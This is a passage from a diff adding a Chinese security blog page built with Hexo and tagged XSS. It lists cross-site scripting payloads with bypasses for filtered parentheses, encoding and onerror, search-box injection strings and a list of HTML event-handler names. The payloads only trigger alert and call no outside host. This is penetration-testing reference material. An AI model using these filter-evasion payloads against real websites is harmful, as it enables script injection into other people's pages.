onerror=location=&#x27;javascript:%61%6C%65%72%74%28%31%29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&#x27;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&quot;javascr&quot;+&quot;ipt:&quot;+&quot;%61%6C%65%72%74%28%31%29&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 括号被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- onerror=被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror     =alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror</span><br><span class="line">=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 属性被转换为大写 --&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 编码后被检测 --&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">搜索框</span><br><span class="line">&lt;!--&#x27;&quot;&gt;&amp;:</span><br><span class="line">&lt;/h1&gt;&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/h2&gt;&lt;details open=&quot;&quot; ontoggle=alert`xss`&gt;&lt;h2&gt;1</span><br><span class="line"></span><br><span class="line">如&#x27;\&#x27;变成&#x27;\\&#x27;用%c0\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="各类动作"><a href="#各类动作" class="headerlink" title="各类动作"></a>各类动作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onabort|onactivate|onafterprint|onafterupdate|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditfocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror|onerrorupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizeend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/10/XSS%E9%80%9A%E8%BF%87js%E8%8E%B7%E5%8F%96url%E6%8E%A5%E5%8F%A3%E5%86%85%E5%AE%B9/" rel="prev" title="XSS通过js获取url接口内容">
+                  <i class="fa fa-angle-left"></i> XSS通过js获取url接口内容
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/03/10/HTTP%E8%AE%A4%E8%AF%81-nginx/" rel="next" title="HTTP认证">
+                  HTTP认证 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">夜落</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">57k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">51 分钟</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script size="50" alpha="0.2" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
